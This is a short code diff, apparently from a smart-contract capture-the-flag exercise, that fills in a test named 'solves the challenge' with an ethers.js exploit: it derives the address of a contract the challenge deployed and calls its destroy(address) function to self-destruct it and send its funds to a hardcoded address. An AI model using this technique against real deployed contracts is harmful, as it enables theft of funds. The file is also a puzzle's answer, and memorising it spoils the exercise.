@@ -20,6 +20,13 @@ before(async () => {
 });
 
 it("solves the challenge", async function () {
+
+  let addr = await ethers.utils.getContractAddress({from:challenge.address, nonce:1})
+
+  let selector = ethers.utils.keccak256(ethers.utils.toUtf8Bytes('destroy(address)')).substring(0,10) // bytes4 function selector
+
+  eoa.sendTransaction({to:addr, data:selector+"0000000000000000000000006B06820261843672e0ca3DC2797b17d779a8493D"}) // padded eoa address
+
 });
 
 after(async () => {
